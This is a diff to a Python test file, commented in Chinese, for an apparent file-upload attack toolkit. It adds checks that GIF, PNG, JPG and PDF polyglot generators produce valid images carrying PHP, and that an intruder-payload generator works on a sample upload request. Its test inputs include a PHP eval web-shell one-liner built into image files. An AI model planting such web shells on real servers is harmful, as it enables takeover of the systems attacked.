@@ -290,29 +290,49 @@ def test_bypass_payloads():
 def test_polyglots():
     """测试Polyglot生成器"""
     print_header("测试Polyglot生成器")
-    
+
     try:
+        import io
+        from PIL import Image
         from payloads.polyglots import PolyglotGenerator
-        
+
         gen = PolyglotGenerator()
         polyglots = gen.get_all_polyglots()
         print_success(f"Polyglot类型: {len(polyglots)} 种")
-        
-        # 测试GIF+PHP
-        gif_php = gen.create_gif_php("<?php echo 'test'; ?>")
-        print_success(f"GIF+PHP polyglot: {len(gif_php)} bytes")
-        
+
+        # 真实有效性断言：结构型 polyglot 必须 1) 以正确魔术字节开头 2) PIL 可打开并 verify
+        # （历史事故：双反斜杠转义让产物全是垃圾字节，仅打印长度永远发现不了）
+        structural_cases = [
+            ("GIF+PHP", gen.create_gif_php("<?php echo 'test'; ?>"), b"GIF89a"),
+            ("PNG+PHP", gen.create_png_php("<?php echo 'test'; ?>"), b"\x89PNG\r\n\x1a\n"),
+            ("JPG+PHP", gen.create_jpg_php("<?php echo 'test'; ?>"), b"\xFF\xD8"),
+        ]
+        for name, data, magic in structural_cases:
+            assert data.startswith(magic), f"{name} 魔术字节错误: {data[:16]!r}"
+            Image.open(io.BytesIO(data)).verify()
+            print_success(f"{name}: {len(data)} bytes（魔术字节 + PIL verify 通过）")
+
+        # 魔术字节前缀型（magic_* 本身不是完整图片，只断言前缀）
+        prefix_cases = [
+            ("gif", b"GIF89a"), ("png", b"\x89PNG\r\n\x1a\n"),
+            ("jpg", b"\xFF\xD8\xFF"), ("pdf", b"%PDF-1.4"),
+        ]
+        for t, magic in prefix_cases:
+            d = gen.create_php_with_magic_bytes("<?php echo 'x'; ?>", t)
+            assert d.startswith(magic), f"magic_{t} 前缀错误: {d[:16]!r}"
+        print_success("magic_* 四类前缀断言通过")
+
         # 测试魔术字节+PHP (修复后的功能)
         magic_gif = gen.create_php_with_magic_bytes("<?php @eval($_POST['x']); ?>", "gif")
         print_success(f"GIF魔术字节+PHP: {len(magic_gif)} bytes")
-        
+
         # 验证修复: 检查是否不会重复添加 <?php 标签
         if b'<?php <?php' not in magic_gif:
             print_success("图片马标签修复验证通过 (无重复标签)")
         else:
             print_error("图片马标签修复验证失败 (存在重复标签)")
             return False
-        
+
         # 测试不带标签的输入
         magic_gif2 = gen.create_php_with_magic_bytes("@eval($_POST['x']);", "gif")
         if b'<?php' in magic_gif2 and b'?>' in magic_gif2:
@@ -320,8 +340,17 @@ def test_polyglots():
         else:
             print_error("无标签输入自动添加标签验证失败")
             return False
-        
+
+        # 长代码分块：>255 字节的代码必须仍能产出有效 GIF（micro 版曾因此抛 ValueError）
+        from payloads.polyglot_builder import PolyglotBuilder
+        long_data = PolyglotBuilder.create_micro_gif_php("A" * 400 + "<?php echo 1; ?>")
+        Image.open(io.BytesIO(long_data)).verify()
+        print_success("micro_gif_php 长代码(>255字节)分块断言通过")
+
         return True
+    except AssertionError as e:
+        print_error(f"Polyglot 有效性断言失败: {e}")
+        return False
     except Exception as e:
         print_error(f"Polyglot生成器测试失败: {e}")
         return False
@@ -339,7 +368,16 @@ def test_intruder_payloads():
         
         factory = PayloadFactory()
         print_success(f"PayloadFactory 策略数: {len(factory._strategies)}")
-        
+
+        # 抽象基类约束：Python 3 下 metaclass 必须显式声明，否则 FuzzStrategy 可被直接实例化
+        from payloads.intruder_payloads import FuzzStrategy
+        try:
+            FuzzStrategy()
+            print_error("FuzzStrategy 抽象约束失效：可直接实例化")
+            return False
+        except TypeError:
+            print_success("FuzzStrategy 抽象约束生效（禁止直接实例化）")
+
         sample_template = """POST /upload.php HTTP/1.1
 Host: example.com
 Content-Type: multipart/form-data; boundary=----b
@@ -352,7 +390,14 @@ x
 ----b--"""
         plist = generate_intruder_payloads(sample_template, languages=["php"], max_payloads=30)
         print_success(f"generate_intruder_payloads: {len(plist)} 个")
-        
+        assert plist, "CRLF 模板产出 0 条 payload"
+
+        # LF 行尾模板（GUI 文本框场景）也必须产出 payload，不允许静默为 0
+        lf_template = sample_template.replace("\r\n", "\n")
+        lf_list = generate_intruder_payloads(lf_template, languages=["php"], max_payloads=30)
+        assert lf_list, "LF 模板产出 0 条 payload（CRLF 归一化失效）"
+        print_success(f"LF 模板产出: {len(lf_list)} 个（CRLF 归一化生效）")
+
         stats = get_payload_statistics()
         print_success(f"统计: {stats['total_strategies']} 策略")
         
